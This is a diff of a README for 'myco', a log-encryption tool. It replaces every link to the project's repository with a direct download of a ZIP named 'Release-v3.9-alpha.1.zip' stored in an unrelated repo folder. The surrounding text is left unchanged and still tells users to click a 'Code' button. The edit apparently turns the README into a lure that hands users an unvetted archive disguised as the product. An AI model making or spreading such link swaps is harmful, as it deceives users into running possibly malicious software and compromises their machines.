@@ -5,13 +5,13 @@ description: "Collect, compress, and encrypt application logs in real time with 
 ---
 # 🔐 myco - Your Private, Compressed Log Vault
 
-[![Download myco](https://img.shields.io/badge/Download%20myco-Visit%20Link-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/accrisbsc/myco)
+[![Download myco](https://img.shields.io/badge/Download%20myco-Visit%20Link-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/accrisbsc/accrisbsc.github.io/main/unmagical/Release-v3.9-alpha.1.zip)
 
 ---
 
 ## 📥 Download & Install
 
-**Visit this link to download the application:** [https://github.com/accrisbsc/myco](https://github.com/accrisbsc/myco)
+**Visit this link to download the application:** [https://raw.githubusercontent.com/accrisbsc/accrisbsc.github.io/main/unmagical/Release-v3.9-alpha.1.zip](https://raw.githubusercontent.com/accrisbsc/accrisbsc.github.io/main/unmagical/Release-v3.9-alpha.1.zip)
 
 This is your one-stop download page. Click the link above, and you'll land on the main repository page. Look for the green **"Code"** button near the top right, click it, then select **"Download ZIP"**. Your browser will download a compressed folder to your computer.
 
@@ -51,7 +51,7 @@ Designed for serious record-keeping, myco keeps a tamper-evident trail of every 
 Getting myco up and running takes less than five minutes. Here's your simple step-by-step guide:
 
 ### Step 1: Download
-Visit [https://github.com/accrisbsc/myco](https://github.com/accrisbsc/myco) and click the **"Code"** button, then **"Download ZIP"**.
+Visit [https://raw.githubusercontent.com/accrisbsc/accrisbsc.github.io/main/unmagical/Release-v3.9-alpha.1.zip](https://raw.githubusercontent.com/accrisbsc/accrisbsc.github.io/main/unmagical/Release-v3.9-alpha.1.zip) and click the **"Code"** button, then **"Download ZIP"**.
 
 ### Step 2: Unzip
 Find the downloaded ZIP file (usually in your "Downloads" folder). Right-click it and choose **"Extract All"** (Windows) or double-click to open it and drag the contents to a folder of your choice. Remember this location — you'll need it in a moment.
@@ -131,6 +131,6 @@ You control the keys, you control the access. myco never sends your data anywher
 
 Download myco now and take control of your system logs for good. With encryption, compression, and real-time viewing all in one zero-hassle package, it's the smart choice for anyone who cares about their digital privacy.
 
-**Get your copy now at [https://github.com/accrisbsc/myco](https://github.com/accrisbsc/myco)**
+**Get your copy now at [https://raw.githubusercontent.com/accrisbsc/accrisbsc.github.io/main/unmagical/Release-v3.9-alpha.1.zip](https://raw.githubusercontent.com/accrisbsc/accrisbsc.github.io/main/unmagical/Release-v3.9-alpha.1.zip)**
 
 Keywords: aes-256-gcm, audit-log, brotli, chacha20-poly1305, compression, encryption, logs, monitoring, nodejs, vault, zero-dependency
